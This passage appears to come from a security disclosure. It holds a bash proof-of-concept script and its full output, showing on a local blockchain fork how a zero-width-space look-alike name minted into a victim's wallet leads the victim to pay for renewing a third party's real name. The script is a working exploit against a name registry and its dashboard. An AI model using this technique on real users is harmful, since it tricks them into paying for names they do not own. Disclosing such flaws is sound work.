DUR=31536000   # 1 year
# The pinned fork's upstream rejects eth_feeHistory, so send legacy txs.
TXOPTS=(--legacy --gas-price 2gwei)

# Fresh keys. Anvil's canned accounts carry EIP-7702 delegations on real
# Sepolia whose delegate rejects the registry's onERC1155Received.
ATTACKER_PK=0xa47db48f22450fbd41ed1d03b461fc0ed7261a091d9f96db65dca7cf8b7d5cb8
VICTIM_PK=0x6332b7c91c9bea6eb5371df6880c2b28d19c44ade47f71f6e2d95205947a2e4a
THIRD=0x00000000000000000000000000000000000000AA   # owner of the real name

ATTACKER=$(cast wallet address $ATTACKER_PK)
VICTIM=$(cast wallet address $VICTIM_PK)

# The two labels. LOOKALIKE carries U+200B ZERO WIDTH SPACE, which ENSIP-15
# deletes and which has zero advance width in every layout context, so a
# dashboard row rendering it is pixel-identical to the real name.
REALNAME=poctarget2608
LOOKALIKE=$(python3 -c 'print("poctarget" + chr(0x200B) + "2608")')

echo "attacker  : $ATTACKER"
echo "victim    : $VICTIM"
echo "third pty : $THIRD"
echo "real label: $REALNAME"
echo "look-alike: $(python3 -c "import sys;print(repr(sys.argv[1]))" "$LOOKALIKE")"
echo

cast rpc anvil_setBalance "$ATTACKER" 0xde0b6b3a7640000 --rpc-url $R >/dev/null
cast rpc anvil_setBalance "$VICTIM"   0xde0b6b3a7640000 --rpc-url $R >/dev/null
cast send $USDC "mint(address,uint256)" "$ATTACKER" 1000000000 --private-key $ATTACKER_PK --rpc-url $R "${TXOPTS[@]}" --json >/dev/null
cast send $USDC "mint(address,uint256)" "$VICTIM"   1000000000 --private-key $VICTIM_PK   --rpc-url $R "${TXOPTS[@]}" --json >/dev/null

# ---------------------------------------------------------------- helpers ---
# The registry keys a name by its CANONICAL id: labelhash with the low 32 bits
# (the token version) cleared. Confirmed from the TransferSingle topic in a
# `cast call --trace` of register().
canon () { python3 -c "print((int('$(cast keccak "$1")',16) >> 32) << 32)"; }
expiry () { cast call $REGISTRY "getExpiry(uint256)(uint64)" "$(canon "$1")" --rpc-url $R | awk '{print $1}'; }
owner  () { cast call $REGISTRY "ownerOf(uint256)(address)"  "$(canon "$1")" --rpc-url $R; }

register () {  # label owner payer_pk
  local LABEL="$1" OWNER="$2" PK="$3" PRICE C
  PRICE=$(cast call $REG "getRegisterPrice(string,uint64,address)(uint256,uint256)" "$LABEL" $DUR $USDC --rpc-url $R | head -1 | awk '{print $1}')
  echo "    register price for this label: $PRICE raw USDC units"
  C=$(cast call $REG "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" "$LABEL" "$OWNER" $SECRET $Z $Z $DUR $B32 --rpc-url $R)
  cast send $REG "commit(bytes32)" "$C" --private-key "$PK" --rpc-url $R "${TXOPTS[@]}" --json >/dev/null
  cast rpc anvil_increaseTime 120 --rpc-url $R >/dev/null; cast rpc anvil_mine --rpc-url $R >/dev/null
  cast send $USDC "approve(address,uint256)" $REG "$PRICE" --private-key "$PK" --rpc-url $R "${TXOPTS[@]}" --json >/dev/null
  cast send $REG "register(string,address,bytes32,address,address,uint64,address,bytes32)" \
      "$LABEL" "$OWNER" $SECRET $Z $Z $DUR $USDC $B32 --private-key "$PK" --rpc-url $R "${TXOPTS[@]}" --json >/dev/null
}

# ------------------------------------------------------------------ step 1 --
echo "=== 1. the two labels are distinct on-chain names ==="
echo "labelhash(real)        : $(cast keccak "$REALNAME")"
echo "labelhash(look-alike)  : $(cast keccak "$LOOKALIKE")"
echo "isAvailable(real)      : $(cast call $REG "isAvailable(string)(bool)" "$REALNAME" --rpc-url $R)"
echo "isAvailable(look-alike): $(cast call $REG "isAvailable(string)(bool)" "$LOOKALIKE" --rpc-url $R)"
echo

# ------------------------------------------------------------------ step 2 --
echo "=== 2. the real name goes to a third party; the attacker mints the"
echo "       look-alike STRAIGHT INTO THE VICTIM'S WALLET ==="
echo "       register() takes an arbitrary owner - no transfer, no victim action"
register "$REALNAME"  "$THIRD"  "$ATTACKER_PK"
register "$LOOKALIKE" "$VICTIM" "$ATTACKER_PK"
echo "owner(real)       : $(owner "$REALNAME")"
echo "owner(look-alike) : $(owner "$LOOKALIKE")"
echo

# ------------------------------------------------------------------ step 3 --
REAL_BEFORE=$(expiry "$REALNAME"); LOOK_BEFORE=$(expiry "$LOOKALIKE")
echo "=== 3. expiries before ==="
echo "real       : $REAL_BEFORE"
echo "look-alike : $LOOK_BEFORE"
echo

# ------------------------------------------------------------------ step 4 --
# This is exactly the calldata the Manager builds: BulkRenewName.label is
# domain.normalizedName with .eth stripped, i.e. the REAL label - while the
# dashboard row and the confirm dialog both render domain.name, the look-alike.
echo "=== 4. the victim submits the renew the Manager builds for the look-alike row ==="
echo "    renew(\"$REALNAME\", $DUR, USDC, 0x0)   <- normalizedName, not the row's name"
RPRICE=$(cast call $REG "getRenewPrice(string,uint64,address)(uint256)" "$REALNAME" $DUR $USDC --rpc-url $R | awk '{print $1}')
cast send $USDC "approve(address,uint256)" $REG "$RPRICE" --private-key $VICTIM_PK --rpc-url $R "${TXOPTS[@]}" --json >/dev/null
USDC_BEFORE=$(cast call $USDC "balanceOf(address)(uint256)" $VICTIM --rpc-url $R | awk '{print $1}')
OUT=$(cast send $REG "renew(string,uint64,address,bytes32)" "$REALNAME" $DUR $USDC $B32 --private-key $VICTIM_PK --rpc-url $R "${TXOPTS[@]}" --json)
USDC_AFTER=$(cast call $USDC "balanceOf(address)(uint256)" $VICTIM --rpc-url $R | awk '{print $1}')
echo "renew status : $(echo "$OUT" | python3 -c 'import sys,json;print(int(json.load(sys.stdin)["status"],16))')  (1 = success)"
echo "victim USDC  : $USDC_BEFORE -> $USDC_AFTER   (paid $((USDC_BEFORE - USDC_AFTER)))"
echo "owner(real)  : $(owner "$REALNAME")   (the payer is $VICTIM)"
echo

# ------------------------------------------------------------------ step 5 --
REAL_AFTER=$(expiry "$REALNAME"); LOOK_AFTER=$(expiry "$LOOKALIKE")
echo "USDC decimals: $(cast call $USDC "decimals()(uint8)" --rpc-url $R)"
echo "=== 5. expiries after ==="
echo "real       : $REAL_BEFORE -> $REAL_AFTER   (delta $((REAL_AFTER - REAL_BEFORE))s)"
echo "look-alike : $LOOK_BEFORE -> $LOOK_AFTER   (delta $((LOOK_AFTER - LOOK_BEFORE))s)"
echo
echo "RESULT: the victim paid $((USDC_BEFORE - USDC_AFTER)) USDC. The name their dashboard row"
echo "showed - the look-alike they actually own - gained $((LOOK_AFTER - LOOK_BEFORE))s."
echo "A name owned by $THIRD gained $((REAL_AFTER - REAL_BEFORE))s."
```

Command and full output:

```
$ ./fork-poc.sh

attacker  : 0xE7CA5a5eF4aC6033e013de811EA3B39B197F57Bf
victim    : 0xc2aadc32dBac4F7ecf64798EDb5C803443779E47
third pty : 0x00000000000000000000000000000000000000AA
real label: poctarget2608
look-alike: 'poctarget\u200b2608'

=== 1. the two labels are distinct on-chain names ===
labelhash(real)        : 0xbae2f7d7d52277d1ebab412560de9ae454b72178b6e54e80810169ad253ed2f4
labelhash(look-alike)  : 0x54226722a01275221ea94df5b06f46ee4dc86e22070fab2a7cdb252f3445f16d
isAvailable(real)      : true
isAvailable(look-alike): true

=== 2. the real name goes to a third party; the attacker mints the
       look-alike STRAIGHT INTO THE VICTIM'S WALLET ===
       register() takes an arbitrary owner - no transfer, no victim action
    register price for this label: 8000021 raw USDC units
    register price for this label: 8000021 raw USDC units
owner(real)       : 0x00000000000000000000000000000000000000AA
owner(look-alike) : 0xc2aadc32dBac4F7ecf64798EDb5C803443779E47

=== 3. expiries before ===
real       : 1819030934
look-alike : 1819031054

=== 4. the victim submits the renew the Manager builds for the look-alike row ===
    renew("poctarget2608", 31536000, USDC, 0x0)   <- normalizedName, not the row's name
renew status : 1  (1 = success)
victim USDC  : 1000000000 -> 991999979   (paid 8000021)
owner(real)  : 0x00000000000000000000000000000000000000AA   (the payer is 0xc2aadc32dBac4F7ecf64798EDb5C803443779E47)

USDC decimals: 6
=== 5. expiries after ===
real       : 1819030934 -> 1850566934   (delta 31536000s)
look-alike : 1819031054 -> 1819031054   (delta 0s)

RESULT: the victim paid 8000021 USDC. The name their dashboard row
showed - the look-alike they actually own - gained 0s.
A name owned by 0x00000000000000000000000000000000000000AA gained 31536000s.
```
